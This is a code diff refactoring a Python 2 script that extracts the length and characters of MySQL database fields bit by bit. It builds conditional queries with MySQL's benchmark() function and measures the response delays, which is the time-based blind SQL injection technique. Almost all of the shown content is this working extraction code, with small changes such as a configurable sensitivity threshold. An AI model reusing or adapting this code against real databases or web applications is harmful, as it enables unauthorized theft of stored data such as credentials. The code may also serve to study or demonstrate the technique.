@@ -11,6 +11,9 @@ cur = db.cursor()
 
 #make iters longer for reliability, smaller for speed
 iters = 500000
+sensitivity = 100
+
+bits8 = [128,64,32,16,8,4,2,1]
 
 def measure(sql):
 	s_time = time.time();
@@ -23,15 +26,13 @@ def getlength(field,table,where):
 	accum = 0
 	mintime = measure("select curdate()")
 	
-	for bitpos in [128,64,32,16,8,4,2,1]:
+	for bitpos in bits8:
 		sql = "select if(length(%s) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,bitpos,iters,table,where)
 		_time = measure(sql)
 
-		if _time / mintime > 100:
-			bit = 1
+		bit = int((_time/mintime) > sensitivity)
+		if bit == 1:
 			accum += bitpos
-		else:
-			bit = 0
 		print "time:",_time,",bit:",bit
 	return accum
 
@@ -39,15 +40,13 @@ def getbits(pos,field,table,where):
 	accum = 0
 	mintime = measure("select curdate()")
 	
-	for bitpos in [128,64,32,16,8,4,2,1]:
+	for bitpos in bits8:
 		sql = "select if(ord(substring(%s,%d,1)) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,pos,bitpos,iters,table,where) 
 		_time = measure(sql)
 		
-		if _time / mintime > 100:
-			bit = 1
+		bit = int((_time/mintime) > sensitivity)
+		if bit == 1:
 			accum += bitpos
-		else:
-			bit = 0
 		print "time:",_time,",bit:",bit
 	return accum
 
